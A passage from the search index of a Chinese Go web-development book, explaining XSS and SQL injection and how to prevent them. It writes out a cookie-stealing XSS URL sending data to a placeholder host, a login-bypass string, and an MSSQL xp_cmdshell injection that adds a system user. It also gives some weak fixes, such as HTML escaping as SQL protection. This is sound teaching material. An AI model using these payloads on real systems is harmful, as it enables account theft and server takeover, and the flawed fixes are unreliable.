CSS)\u7684\u7f29\u5199\u6df7\u6dc6\uff0c\u6545\u5c06\u8de8\u7ad9\u811a\u672c\u653b\u51fb\u7f29\u5199\u4e3aXSS\u3002XSS\u662f\u4e00\u79cd\u5e38\u89c1\u7684web\u5b89\u5168\u6f0f\u6d1e\uff0c\u5b83\u5141\u8bb8\u653b\u51fb\u8005\u5c06\u6076\u610f\u4ee3\u7801\u690d\u5165\u5230\u63d0\u4f9b\u7ed9\u5176\u5b83\u7528\u6237\u4f7f\u7528\u7684\u9875\u9762\u4e2d\u3002\u4e0d\u540c\u4e8e\u5927\u591a\u6570\u653b\u51fb(\u4e00\u822c\u53ea\u6d89\u53ca\u653b\u51fb\u8005\u548c\u53d7\u5bb3\u8005)\uff0cXSS\u6d89\u53ca\u5230\u4e09\u65b9\uff0c\u5373\u653b\u51fb\u8005\u3001\u5ba2\u6237\u7aef\u4e0eWeb\u5e94\u7528\u3002XSS\u7684\u653b\u51fb\u76ee\u6807\u662f\u4e3a\u4e86\u76d7\u53d6\u5b58\u50a8\u5728\u5ba2\u6237\u7aef\u7684cookie\u6216\u8005\u5176\u4ed6\u7f51\u7ad9\u7528\u4e8e\u8bc6\u522b\u5ba2\u6237\u7aef\u8eab\u4efd\u7684\u654f\u611f\u4fe1\u606f\u3002\u4e00\u65e6\u83b7\u53d6\u5230\u5408\u6cd5\u7528\u6237\u7684\u4fe1\u606f\u540e\uff0c\u653b\u51fb\u8005\u751a\u81f3\u53ef\u4ee5\u5047\u5192\u5408\u6cd5\u7528\u6237\u4e0e\u7f51\u7ad9\u8fdb\u884c\u4ea4\u4e92\u3002</p> <p>XSS\u901a\u5e38\u53ef\u4ee5\u5206\u4e3a\u4e24\u5927\u7c7b\uff1a\u4e00\u7c7b\u662f\u5b58\u50a8\u578bXSS\uff0c\u4e3b\u8981\u51fa\u73b0\u5728\u8ba9\u7528\u6237\u8f93\u5165\u6570\u636e\uff0c\u4f9b\u5176\u4ed6\u6d4f\u89c8\u6b64\u9875\u7684\u7528\u6237\u8fdb\u884c\u67e5\u770b\u7684\u5730\u65b9\uff0c\u5305\u62ec\u7559\u8a00\u3001\u8bc4\u8bba\u3001\u535a\u5ba2\u65e5\u5fd7\u548c\u5404\u7c7b\u8868\u5355\u7b49\u3002\u5e94\u7528\u7a0b\u5e8f\u4ece\u6570\u636e\u5e93\u4e2d\u67e5\u8be2\u6570\u636e\uff0c\u5728\u9875\u9762\u4e2d\u663e\u793a\u51fa\u6765\uff0c\u653b\u51fb\u8005\u5728\u76f8\u5173\u9875\u9762\u8f93\u5165\u6076\u610f\u7684\u811a\u672c\u6570\u636e\u540e\uff0c\u7528\u6237\u6d4f\u89c8\u6b64\u7c7b\u9875\u9762\u65f6\u5c31\u53ef\u80fd\u53d7\u5230\u653b\u51fb\u3002\u8fd9\u4e2a\u6d41\u7a0b\u7b80\u5355\u53ef\u4ee5\u63cf\u8ff0\u4e3a:\u6076\u610f\u7528\u6237\u7684Html\u8f93\u5165Web\u7a0b\u5e8f-&gt;\u8fdb\u5165\u6570\u636e\u5e93-&gt;Web\u7a0b\u5e8f-&gt;\u7528\u6237\u6d4f\u89c8\u5668\u3002\u53e6\u4e00\u7c7b\u662f\u53cd\u5c04\u578bXSS\uff0c\u4e3b\u8981\u505a\u6cd5\u662f\u5c06\u811a\u672c\u4ee3\u7801\u52a0\u5165URL\u5730\u5740\u7684\u8bf7\u6c42\u53c2\u6570\u91cc\uff0c\u8bf7\u6c42\u53c2\u6570\u8fdb\u5165\u7a0b\u5e8f\u540e\u5728\u9875\u9762\u76f4\u63a5\u8f93\u51fa\uff0c\u7528\u6237\u70b9\u51fb\u7c7b\u4f3c\u7684\u6076\u610f\u94fe\u63a5\u5c31\u53ef\u80fd\u53d7\u5230\u653b\u51fb\u3002</p> <p>XSS\u76ee\u524d\u4e3b\u8981\u7684\u624b\u6bb5\u548c\u76ee\u7684\u5982\u4e0b\uff1a</p> <ul> <li>\u76d7\u7528cookie\uff0c\u83b7\u53d6\u654f\u611f\u4fe1\u606f\u3002</li> <li>\u5229\u7528\u690d\u5165Flash\uff0c\u901a\u8fc7crossdomain\u6743\u9650\u8bbe\u7f6e\u8fdb\u4e00\u6b65\u83b7\u53d6\u66f4\u9ad8\u6743\u9650\uff1b\u6216\u8005\u5229\u7528Java\u7b49\u5f97\u5230\u7c7b\u4f3c\u7684\u64cd\u4f5c\u3002</li> <li>\u5229\u7528iframe\u3001frame\u3001XMLHttpRequest\u6216\u4e0a\u8ff0Flash\u7b49\u65b9\u5f0f\uff0c\u4ee5\uff08\u88ab\u653b\u51fb\u8005\uff09\u7528\u6237\u7684\u8eab\u4efd\u6267\u884c\u4e00\u4e9b\u7ba1\u7406\u52a8\u4f5c\uff0c\u6216\u6267\u884c\u4e00\u4e9b\u5982:\u53d1\u5fae\u535a\u3001\u52a0\u597d\u53cb\u3001\u53d1\u79c1\u4fe1\u7b49\u5e38\u89c4\u64cd\u4f5c\uff0c\u524d\u6bb5\u65f6\u95f4\u65b0\u6d6a\u5fae\u535a\u5c31\u906d\u9047\u8fc7\u4e00\u6b21XSS\u3002</li> <li>\u5229\u7528\u53ef\u88ab\u653b\u51fb\u7684\u57df\u53d7\u5230\u5176\u4ed6\u57df\u4fe1\u4efb\u7684\u7279\u70b9\uff0c\u4ee5\u53d7\u4fe1\u4efb\u6765\u6e90\u7684\u8eab\u4efd\u8bf7\u6c42\u4e00\u4e9b\u5e73\u65f6\u4e0d\u5141\u8bb8\u7684\u64cd\u4f5c\uff0c\u5982\u8fdb\u884c\u4e0d\u5f53\u7684\u6295\u7968\u6d3b\u52a8\u3002</li> <li>\u5728\u8bbf\u95ee\u91cf\u6781\u5927\u7684\u4e00\u4e9b\u9875\u9762\u4e0a\u7684XSS\u53ef\u4ee5\u653b\u51fb\u4e00\u4e9b\u5c0f\u578b\u7f51\u7ad9\uff0c\u5b9e\u73b0DDoS\u653b\u51fb\u7684\u6548\u679c</li> </ul>"},{"location":"09.3/#xss_1","title":"XSS\u7684\u539f\u7406","text":"<p>Web\u5e94\u7528\u672a\u5bf9\u7528\u6237\u63d0\u4ea4\u8bf7\u6c42\u7684\u6570\u636e\u505a\u5145\u5206\u7684\u68c0\u67e5\u8fc7\u6ee4\uff0c\u5141\u8bb8\u7528\u6237\u5728\u63d0\u4ea4\u7684\u6570\u636e\u4e2d\u63ba\u5165HTML\u4ee3\u7801(\u6700\u4e3b\u8981\u7684\u662f\u201c&gt;\u201d\u3001\u201c&lt;\u201d)\uff0c\u5e76\u5c06\u672a\u7ecf\u8f6c\u4e49\u7684\u6076\u610f\u4ee3\u7801\u8f93\u51fa\u5230\u7b2c\u4e09\u65b9\u7528\u6237\u7684\u6d4f\u89c8\u5668\u89e3\u91ca\u6267\u884c\uff0c\u662f\u5bfc\u81f4XSS\u6f0f\u6d1e\u7684\u4ea7\u751f\u539f\u56e0\u3002</p> <p>\u63a5\u4e0b\u6765\u4ee5\u53cd\u5c04\u6027XSS\u4e3e\u4f8b\u8bf4\u660eXSS\u7684\u8fc7\u7a0b\uff1a\u73b0\u5728\u6709\u4e00\u4e2a\u7f51\u7ad9\uff0c\u6839\u636e\u53c2\u6570\u8f93\u51fa\u7528\u6237\u7684\u540d\u79f0\uff0c\u4f8b\u5982\u8bbf\u95eeurl\uff1a<code>http://127.0.0.1/?name=astaxie</code>\uff0c\u5c31\u4f1a\u5728\u6d4f\u89c8\u5668\u8f93\u51fa\u5982\u4e0b\u4fe1\u606f\uff1a</p> <pre><code>hello astaxie\n</code></pre> <p>\u5982\u679c\u6211\u4eec\u4f20\u9012\u8fd9\u6837\u7684url\uff1a<code>http://127.0.0.1/?name=&amp;#60;script&amp;#62;alert(&amp;#39;astaxie,xss&amp;#39;)&amp;#60;/script&amp;#62;</code>,\u8fd9\u65f6\u4f60\u5c31\u4f1a\u53d1\u73b0\u6d4f\u89c8\u5668\u8df3\u51fa\u4e00\u4e2a\u5f39\u51fa\u6846\uff0c\u8fd9\u8bf4\u660e\u7ad9\u70b9\u5df2\u7ecf\u5b58\u5728\u4e86XSS\u6f0f\u6d1e\u3002\u90a3\u4e48\u6076\u610f\u7528\u6237\u662f\u5982\u4f55\u76d7\u53d6Cookie\u7684\u5462\uff1f\u4e0e\u4e0a\u7c7b\u4f3c\uff0c\u5982\u4e0b\u8fd9\u6837\u7684url\uff1a<code>http://127.0.0.1/?name=&amp;#60;script&amp;#62;document.location.href='http://www.xxx.com/cookie?'+document.cookie&amp;#60;/script&amp;#62;</code>\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u628a\u5f53\u524d\u7684cookie\u53d1\u9001\u5230\u6307\u5b9a\u7684\u7ad9\u70b9\uff1a<code>www.xxx.com</code>\u3002\u4f60\u4e5f\u8bb8\u4f1a\u8bf4\uff0c\u8fd9\u6837\u7684URL\u4e00\u770b\u5c31\u6709\u95ee\u9898\uff0c\u600e\u4e48\u4f1a\u6709\u4eba\u70b9\u51fb\uff1f\uff0c\u662f\u7684\uff0c\u8fd9\u7c7b\u7684URL\u4f1a\u8ba9\u4eba\u6000\u7591\uff0c\u4f46\u5982\u679c\u4f7f\u7528\u77ed\u7f51\u5740\u670d\u52a1\u5c06\u4e4b\u7f29\u77ed\uff0c\u4f60\u8fd8\u770b\u5f97\u51fa\u6765\u4e48\uff1f\u653b\u51fb\u8005\u5c06\u7f29\u77ed\u8fc7\u540e\u7684url\u901a\u8fc7\u67d0\u4e9b\u9014\u5f84\u4f20\u64ad\u5f00\u6765\uff0c\u4e0d\u660e\u771f\u76f8\u7684\u7528\u6237\u4e00\u65e6\u70b9\u51fb\u4e86\u8fd9\u6837\u7684url\uff0c\u76f8\u5e94cookie\u6570\u636e\u5c31\u4f1a\u88ab\u53d1\u9001\u4e8b\u5148\u8bbe\u5b9a\u597d\u7684\u7ad9\u70b9\uff0c\u8fd9\u6837\u5b50\u5c31\u76d7\u5f97\u4e86\u7528\u6237\u7684cookie\u4fe1\u606f\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u5229\u7528Websleuth\u4e4b\u7c7b\u7684\u5de5\u5177\u6765\u68c0\u67e5\u662f\u5426\u80fd\u76d7\u53d6\u90a3\u4e2a\u7528\u6237\u7684\u8d26\u6237\u3002</p> <p>\u66f4\u52a0\u8be6\u7ec6\u7684\u5173\u4e8eXSS\u7684\u5206\u6790\u5927\u5bb6\u53ef\u4ee5\u53c2\u8003\u8fd9\u7bc7\u53eb\u505a\u300a\u65b0\u6d6a\u5fae\u535aXSS\u4e8b\u4ef6\u5206\u6790\u300b\u7684\u6587\u7ae0\u3002</p>"},{"location":"09.3/#xss_2","title":"\u5982\u4f55\u9884\u9632XSS","text":"<p>\u7b54\u6848\u5f88\u7b80\u5355\uff0c\u575a\u51b3\u4e0d\u8981\u76f8\u4fe1\u7528\u6237\u7684\u4efb\u4f55\u8f93\u5165\uff0c\u5e76\u8fc7\u6ee4\u6389\u8f93\u5165\u4e2d\u7684\u6240\u6709\u7279\u6b8a\u5b57\u7b26\u3002\u8fd9\u6837\u5c31\u80fd\u6d88\u706d\u7edd\u5927\u90e8\u5206\u7684XSS\u653b\u51fb\u3002</p> <p>\u76ee\u524d\u9632\u5fa1XSS\u4e3b\u8981\u6709\u5982\u4e0b\u51e0\u79cd\u65b9\u5f0f\uff1a</p> <ul> <li> <p>\u8fc7\u6ee4\u7279\u6b8a\u5b57\u7b26</p> <p>\u907f\u514dXSS\u7684\u65b9\u6cd5\u4e4b\u4e00\u4e3b\u8981\u662f\u5c06\u7528\u6237\u6240\u63d0\u4f9b\u7684\u5185\u5bb9\u8fdb\u884c\u8fc7\u6ee4\uff0cGo\u8bed\u8a00\u63d0\u4f9b\u4e86HTML\u7684\u8fc7\u6ee4\u51fd\u6570\uff1a</p> <p>text/template\u5305\u4e0b\u9762\u7684HTMLEscapeString\u3001JSEscapeString\u7b49\u51fd\u6570</p> </li> <li> <p>\u4f7f\u7528HTTP\u5934\u6307\u5b9a\u7c7b\u578b</p> </li> </ul> <pre><code>`w.Header().Set(\"Content-Type\",\"text/javascript\")`\n\n\u8fd9\u6837\u5c31\u53ef\u4ee5\u8ba9\u6d4f\u89c8\u5668\u89e3\u6790javascript\u4ee3\u7801\uff0c\u800c\u4e0d\u4f1a\u662fhtml\u8f93\u51fa\u3002\n</code></pre>"},{"location":"09.3/#_1","title":"\u603b\u7ed3","text":"<p>XSS\u6f0f\u6d1e\u662f\u76f8\u5f53\u6709\u5371\u5bb3\u7684\uff0c\u5728\u5f00\u53d1Web\u5e94\u7528\u7684\u65f6\u5019\uff0c\u4e00\u5b9a\u8981\u8bb0\u4f4f\u8fc7\u6ee4\u6570\u636e\uff0c\u7279\u522b\u662f\u5728\u8f93\u51fa\u5230\u5ba2\u6237\u7aef\u4e4b\u524d\uff0c\u8fd9\u662f\u73b0\u5728\u884c\u4e4b\u6709\u6548\u7684\u9632\u6b62XSS\u7684\u624b\u6bb5\u3002</p>"},{"location":"09.3/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u786e\u4fdd\u8f93\u5165\u8fc7\u6ee4</li> <li>\u4e0b\u4e00\u8282: \u907f\u514dSQL\u6ce8\u5165</li> </ul>"},{"location":"09.4/","title":"9.4 \u907f\u514dSQL\u6ce8\u5165","text":""},{"location":"09.4/#sql","title":"\u4ec0\u4e48\u662fSQL\u6ce8\u5165","text":"<p>SQL\u6ce8\u5165\u653b\u51fb\uff08SQL Injection\uff09\uff0c\u7b80\u79f0\u6ce8\u5165\u653b\u51fb\uff0c\u662fWeb\u5f00\u53d1\u4e2d\u6700\u5e38\u89c1\u7684\u4e00\u79cd\u5b89\u5168\u6f0f\u6d1e\u3002\u53ef\u4ee5\u7528\u5b83\u6765\u4ece\u6570\u636e\u5e93\u83b7\u53d6\u654f\u611f\u4fe1\u606f\uff0c\u6216\u8005\u5229\u7528\u6570\u636e\u5e93\u7684\u7279\u6027\u6267\u884c\u6dfb\u52a0\u7528\u6237\uff0c\u5bfc\u51fa\u6587\u4ef6\u7b49\u4e00\u7cfb\u5217\u6076\u610f\u64cd\u4f5c\uff0c\u751a\u81f3\u6709\u53ef\u80fd\u83b7\u53d6\u6570\u636e\u5e93\u4e43\u81f3\u7cfb\u7edf\u7528\u6237\u6700\u9ad8\u6743\u9650\u3002</p> <p>\u800c\u9020\u6210SQL\u6ce8\u5165\u7684\u539f\u56e0\u662f\u56e0\u4e3a\u7a0b\u5e8f\u6ca1\u6709\u6709\u6548\u8fc7\u6ee4\u7528\u6237\u7684\u8f93\u5165\uff0c\u4f7f\u653b\u51fb\u8005\u6210\u529f\u7684\u5411\u670d\u52a1\u5668\u63d0\u4ea4\u6076\u610f\u7684SQL\u67e5\u8be2\u4ee3\u7801\uff0c\u7a0b\u5e8f\u5728\u63a5\u6536\u540e\u9519\u8bef\u7684\u5c06\u653b\u51fb\u8005\u7684\u8f93\u5165\u4f5c\u4e3a\u67e5\u8be2\u8bed\u53e5\u7684\u4e00\u90e8\u5206\u6267\u884c\uff0c\u5bfc\u81f4\u539f\u59cb\u7684\u67e5\u8be2\u903b\u8f91\u88ab\u6539\u53d8\uff0c\u989d\u5916\u7684\u6267\u884c\u4e86\u653b\u51fb\u8005\u7cbe\u5fc3\u6784\u9020\u7684\u6076\u610f\u4ee3\u7801\u3002</p>"},{"location":"09.4/#sql_1","title":"SQL\u6ce8\u5165\u5b9e\u4f8b","text":"<p>\u5f88\u591aWeb\u5f00\u53d1\u8005\u6ca1\u6709\u610f\u8bc6\u5230SQL\u67e5\u8be2\u662f\u53ef\u4ee5\u88ab\u7be1\u6539\u7684\uff0c\u4ece\u800c\u628aSQL\u67e5\u8be2\u5f53\u4f5c\u53ef\u4fe1\u4efb\u7684\u547d\u4ee4\u3002\u6b8a\u4e0d\u77e5\uff0cSQL\u67e5\u8be2\u662f\u53ef\u4ee5\u7ed5\u5f00\u8bbf\u95ee\u63a7\u5236\uff0c\u4ece\u800c\u7ed5\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u548c\u6743\u9650\u68c0\u67e5\u7684\u3002\u66f4\u6709\u751a\u8005\uff0c\u6709\u53ef\u80fd\u901a\u8fc7SQL\u67e5\u8be2\u53bb\u8fd0\u884c\u4e3b\u673a\u7cfb\u7edf\u7ea7\u7684\u547d\u4ee4\u3002</p> <p>\u4e0b\u9762\u5c06\u901a\u8fc7\u4e00\u4e9b\u771f\u5b9e\u7684\u4f8b\u5b50\u6765\u8be6\u7ec6\u8bb2\u89e3SQL\u6ce8\u5165\u7684\u65b9\u5f0f\u3002</p> <p>\u8003\u8651\u4ee5\u4e0b\u7b80\u5355\u7684\u767b\u5f55\u8868\u5355\uff1a <pre><code>&lt;form action=\"/login\" method=\"POST\"&gt;\n&lt;p&gt;Username: &lt;input type=\"text\" name=\"username\" /&gt;&lt;/p&gt;\n&lt;p&gt;Password: &lt;input type=\"password\" name=\"password\" /&gt;&lt;/p&gt;\n&lt;p&gt;&lt;input type=\"submit\" value=\"\u767b\u9646\" /&gt;&lt;/p&gt;\n&lt;/form&gt;\n</code></pre> \u6211\u4eec\u7684\u5904\u7406\u91cc\u9762\u7684SQL\u53ef\u80fd\u662f\u8fd9\u6837\u7684\uff1a <pre><code>username:=r.Form.Get(\"username\")\npassword:=r.Form.Get(\"password\")\nsql:=\"SELECT * FROM user WHERE username='\"+username+\"' AND password='\"+password+\"'\"\n</code></pre> \u5982\u679c\u7528\u6237\u7684\u8f93\u5165\u7684\u7528\u6237\u540d\u5982\u4e0b\uff0c\u5bc6\u7801\u4efb\u610f <pre><code>myuser' or 'foo' = 'foo' --\n</code></pre> \u90a3\u4e48\u6211\u4eec\u7684SQL\u53d8\u6210\u4e86\u5982\u4e0b\u6240\u793a\uff1a <pre><code>SELECT * FROM user WHERE username='myuser' or 'foo' = 'foo' --'' AND password='xxx'\n</code></pre> \u5728SQL\u91cc\u9762<code>--</code>\u662f\u6ce8\u91ca\u6807\u8bb0\uff0c\u6240\u4ee5\u67e5\u8be2\u8bed\u53e5\u4f1a\u5728\u6b64\u4e2d\u65ad\u3002\u8fd9\u5c31\u8ba9\u653b\u51fb\u8005\u5728\u4e0d\u77e5\u9053\u4efb\u4f55\u5408\u6cd5\u7528\u6237\u540d\u548c\u5bc6\u7801\u7684\u60c5\u51b5\u4e0b\u6210\u529f\u767b\u5f55\u4e86\u3002</p> <p>\u5bf9\u4e8eMSSQL\u8fd8\u6709\u66f4\u52a0\u5371\u9669\u7684\u4e00\u79cdSQL\u6ce8\u5165\uff0c\u5c31\u662f\u63a7\u5236\u7cfb\u7edf\uff0c\u4e0b\u9762\u8fd9\u4e2a\u53ef\u6015\u7684\u4f8b\u5b50\u5c06\u6f14\u793a\u5982\u4f55\u5728\u67d0\u4e9b\u7248\u672c\u7684MSSQL\u6570\u636e\u5e93\u4e0a\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u3002 <pre><code>sql:=\"SELECT * FROM products WHERE name LIKE '%\"+prod+\"%'\"\nDb.Exec(sql)\n</code></pre> \u5982\u679c\u653b\u51fb\u63d0\u4ea4<code>a%' exec master..xp_cmdshell 'net user test testpass /ADD' --</code>\u4f5c\u4e3a\u53d8\u91cf prod\u7684\u503c\uff0c\u90a3\u4e48sql\u5c06\u4f1a\u53d8\u6210 <pre><code>sql:=\"SELECT * FROM products WHERE name LIKE '%a%' exec master..xp_cmdshell 'net user test testpass /ADD'--%'\"\n</code></pre> MSSQL\u670d\u52a1\u5668\u4f1a\u6267\u884c\u8fd9\u6761SQL\u8bed\u53e5\uff0c\u5305\u62ec\u5b83\u540e\u9762\u90a3\u4e2a\u7528\u4e8e\u5411\u7cfb\u7edf\u6dfb\u52a0\u65b0\u7528\u6237\u7684\u547d\u4ee4\u3002\u5982\u679c\u8fd9\u4e2a\u7a0b\u5e8f\u662f\u4ee5sa\u8fd0\u884c\u800c MSSQLSERVER\u670d\u52a1\u53c8\u6709\u8db3\u591f\u7684\u6743\u9650\u7684\u8bdd\uff0c\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u83b7\u5f97\u4e00\u4e2a\u7cfb\u7edf\u5e10\u53f7\u6765\u8bbf\u95ee\u4e3b\u673a\u4e86\u3002</p> <p>\u867d\u7136\u4ee5\u4e0a\u7684\u4f8b\u5b50\u662f\u9488\u5bf9\u67d0\u4e00\u7279\u5b9a\u7684\u6570\u636e\u5e93\u7cfb\u7edf\u7684\uff0c\u4f46\u662f\u8fd9\u5e76\u4e0d\u4ee3\u8868\u4e0d\u80fd\u5bf9\u5176\u5b83\u6570\u636e\u5e93\u7cfb\u7edf\u5b9e\u65bd\u7c7b\u4f3c\u7684\u653b\u51fb\u3002\u9488\u5bf9\u8fd9\u79cd\u5b89\u5168\u6f0f\u6d1e\uff0c\u53ea\u8981\u4f7f\u7528\u4e0d\u540c\u65b9\u6cd5\uff0c\u5404\u79cd\u6570\u636e\u5e93\u90fd\u6709\u53ef\u80fd\u906d\u6b83\u3002</p>"},{"location":"09.4/#sql_2","title":"\u5982\u4f55\u9884\u9632SQL\u6ce8\u5165","text":"<p>\u4e5f\u8bb8\u4f60\u4f1a\u8bf4\u653b\u51fb\u8005\u8981\u77e5\u9053\u6570\u636e\u5e93\u7ed3\u6784\u7684\u4fe1\u606f\u624d\u80fd\u5b9e\u65bdSQL\u6ce8\u5165\u653b\u51fb\u3002\u786e\u5b9e\u5982\u6b64\uff0c\u4f46\u6ca1\u4eba\u80fd\u4fdd\u8bc1\u653b\u51fb\u8005\u4e00\u5b9a\u62ff\u4e0d\u5230\u8fd9\u4e9b\u4fe1\u606f\uff0c\u4e00\u65e6\u4ed6\u4eec\u62ff\u5230\u4e86\uff0c\u6570\u636e\u5e93\u5c31\u5b58\u5728\u6cc4\u9732\u7684\u5371\u9669\u3002\u5982\u679c\u4f60\u5728\u7528\u5f00\u653e\u6e90\u4ee3\u7801\u7684\u8f6f\u4ef6\u5305\u6765\u8bbf\u95ee\u6570\u636e\u5e93\uff0c\u6bd4\u5982\u8bba\u575b\u7a0b\u5e8f\uff0c\u653b\u51fb\u8005\u5c31\u5f88\u5bb9\u6613\u5f97\u5230\u76f8\u5173\u7684\u4ee3\u7801\u3002\u5982\u679c\u8fd9\u4e9b\u4ee3\u7801\u8bbe\u8ba1\u4e0d\u826f\u7684\u8bdd\uff0c\u98ce\u9669\u5c31\u66f4\u5927\u4e86\u3002\u76ee\u524dDiscuz\u3001phpwind\u3001phpcms\u7b49\u8fd9\u4e9b\u6d41\u884c\u7684\u5f00\u6e90\u7a0b\u5e8f\u90fd\u6709\u88abSQL\u6ce8\u5165\u653b\u51fb\u7684\u5148\u4f8b\u3002</p> <p>\u8fd9\u4e9b\u653b\u51fb\u603b\u662f\u53d1\u751f\u5728\u5b89\u5168\u6027\u4e0d\u9ad8\u7684\u4ee3\u7801\u4e0a\u3002\u6240\u4ee5\uff0c\u6c38\u8fdc\u4e0d\u8981\u4fe1\u4efb\u5916\u754c\u8f93\u5165\u7684\u6570\u636e\uff0c\u7279\u522b\u662f\u6765\u81ea\u4e8e\u7528\u6237\u7684\u6570\u636e\uff0c\u5305\u62ec\u9009\u62e9\u6846\u3001\u8868\u5355\u9690\u85cf\u57df\u548c cookie\u3002\u5c31\u5982\u4e0a\u9762\u7684\u7b2c\u4e00\u4e2a\u4f8b\u5b50\u90a3\u6837\uff0c\u5c31\u7b97\u662f\u6b63\u5e38\u7684\u67e5\u8be2\u4e5f\u6709\u53ef\u80fd\u9020\u6210\u707e\u96be\u3002</p> <p>SQL\u6ce8\u5165\u653b\u51fb\u7684\u5371\u5bb3\u8fd9\u4e48\u5927\uff0c\u90a3\u4e48\u8be5\u5982\u4f55\u6765\u9632\u6cbb\u5462?\u4e0b\u9762\u8fd9\u4e9b\u5efa\u8bae\u6216\u8bb8\u5bf9\u9632\u6cbbSQL\u6ce8\u5165\u6709\u4e00\u5b9a\u7684\u5e2e\u52a9\u3002</p> <ol> <li>\u4e25\u683c\u9650\u5236Web\u5e94\u7528\u7684\u6570\u636e\u5e93\u7684\u64cd\u4f5c\u6743\u9650\uff0c\u7ed9\u6b64\u7528\u6237\u63d0\u4f9b\u4ec5\u4ec5\u80fd\u591f\u6ee1\u8db3\u5176\u5de5\u4f5c\u7684\u6700\u4f4e\u6743\u9650\uff0c\u4ece\u800c\u6700\u5927\u9650\u5ea6\u7684\u51cf\u5c11\u6ce8\u5165\u653b\u51fb\u5bf9\u6570\u636e\u5e93\u7684\u5371\u5bb3\u3002</li> <li>\u68c0\u67e5\u8f93\u5165\u7684\u6570\u636e\u662f\u5426\u5177\u6709\u6240\u671f\u671b\u7684\u6570\u636e\u683c\u5f0f\uff0c\u4e25\u683c\u9650\u5236\u53d8\u91cf\u7684\u7c7b\u578b\uff0c\u4f8b\u5982\u4f7f\u7528regexp\u5305\u8fdb\u884c\u4e00\u4e9b\u5339\u914d\u5904\u7406\uff0c\u6216\u8005\u4f7f\u7528strconv\u5305\u5bf9\u5b57\u7b26\u4e32\u8f6c\u5316\u6210\u5176\u4ed6\u57fa\u672c\u7c7b\u578b\u7684\u6570\u636e\u8fdb\u884c\u5224\u65ad\u3002</li> <li>\u5bf9\u8fdb\u5165\u6570\u636e\u5e93\u7684\u7279\u6b8a\u5b57\u7b26\uff08'\"\\\u5c16\u62ec\u53f7&amp;*;\u7b49\uff09\u8fdb\u884c\u8f6c\u4e49\u5904\u7406\uff0c\u6216\u7f16\u7801\u8f6c\u6362\u3002Go \u7684<code>text/template</code>\u5305\u91cc\u9762\u7684<code>HTMLEscapeString</code>\u51fd\u6570\u53ef\u4ee5\u5bf9\u5b57\u7b26\u4e32\u8fdb\u884c\u8f6c\u4e49\u5904\u7406\u3002</li> <li>\u6240\u6709\u7684\u67e5\u8be2\u8bed\u53e5\u5efa\u8bae\u4f7f\u7528\u6570\u636e\u5e93\u63d0\u4f9b\u7684\u53c2\u6570\u5316\u67e5\u8be2\u63a5\u53e3\uff0c\u53c2\u6570\u5316\u7684\u8bed\u53e5\u4f7f\u7528\u53c2\u6570\u800c\u4e0d\u662f\u5c06\u7528\u6237\u8f93\u5165\u53d8\u91cf\u5d4c\u5165\u5230SQL\u8bed\u53e5\u4e2d\uff0c\u5373\u4e0d\u8981\u76f4\u63a5\u62fc\u63a5SQL\u8bed\u53e5\u3002\u4f8b\u5982\u4f7f\u7528<code>database/sql</code>\u91cc\u9762\u7684\u67e5\u8be2\u51fd\u6570<code>Prepare</code>\u548c<code>Query</code>\uff0c\u6216\u8005<code>Exec(query string, args ...interface{})</code>\u3002</li> <li>\u5728\u5e94\u7528\u53d1\u5e03\u4e4b\u524d\u5efa\u8bae\u4f7f\u7528\u4e13\u4e1a\u7684SQL\u6ce8\u5165\u68c0\u6d4b\u5de5\u5177\u8fdb\u884c\u68c0\u6d4b\uff0c\u4ee5\u53ca\u65f6\u4fee\u8865\u88ab\u53d1\u73b0\u7684SQL\u6ce8\u5165\u6f0f\u6d1e\u3002\u7f51\u4e0a\u6709\u5f88\u591a\u8fd9\u65b9\u9762\u7684\u5f00\u6e90\u5de5\u5177\uff0c\u4f8b\u5982sqlmap\u3001SQLninja\u7b49\u3002</li> <li>\u907f\u514d\u7f51\u7ad9\u6253\u5370\u51faSQL\u9519\u8bef\u4fe1\u606f\uff0c\u6bd4\u5982\u7c7b\u578b\u9519\u8bef\u3001\u5b57\u6bb5\u4e0d\u5339\u914d\u7b49\uff0c\u628a\u4ee3\u7801\u91cc\u7684SQL\u8bed\u53e5\u66b4\u9732\u51fa\u6765\uff0c\u4ee5\u9632\u6b62\u653b\u51fb\u8005\u5229\u7528\u8fd9\u4e9b\u9519\u8bef\u4fe1\u606f\u8fdb\u884cSQL\u6ce8\u5165\u3002</li> </ol>"},{"location":"09.4/#_1","title":"\u603b\u7ed3","text":"<p>\u901a\u8fc7\u4e0a\u9762\u7684\u793a\u4f8b\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\uff0cSQL\u6ce8\u5165\u662f\u5371\u5bb3\u76f8\u5f53\u5927\u7684\u5b89\u5168\u6f0f\u6d1e\u3002\u6240\u4ee5\u5bf9\u4e8e\u6211\u4eec\u5e73\u5e38\u7f16\u5199\u7684Web\u5e94\u7528\uff0c\u5e94\u8be5\u5bf9\u4e8e\u6bcf\u4e00\u4e2a\u5c0f\u7ec6\u8282\u90fd\u8981\u975e\u5e38\u91cd\u89c6\uff0c\u7ec6\u8282\u51b3\u5b9a\u547d\u8fd0\uff0c\u751f\u6d3b\u5982\u6b64\uff0c\u7f16\u5199Web\u5e94\u7528\u4e5f\u662f\u8fd9\u6837\u3002</p>"},{"location":"09.4/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u907f\u514dXSS\u653b\u51fb</li> <li>\u4e0b\u4e00\u8282: \u5b58\u50a8\u5bc6\u7801</li> </ul>"},{"location":"09.5/","title":"9.5 \u5b58\u50a8\u5bc6\u7801","text":"<p>\u8fc7\u53bb\u4e00\u6bb5\u65f6\u95f4\u4ee5\u6765, \u8bb8\u591a\u7684\u7f51\u7ad9\u906d\u9047\u7528\u6237\u5bc6\u7801\u6570\u636e\u6cc4\u9732\u4e8b\u4ef6, \u8fd9\u5176\u4e2d\u5305\u62ec\u9876\u7ea7\u7684\u4e92\u8054\u7f51\u4f01\u4e1a\u2013Linkedin, 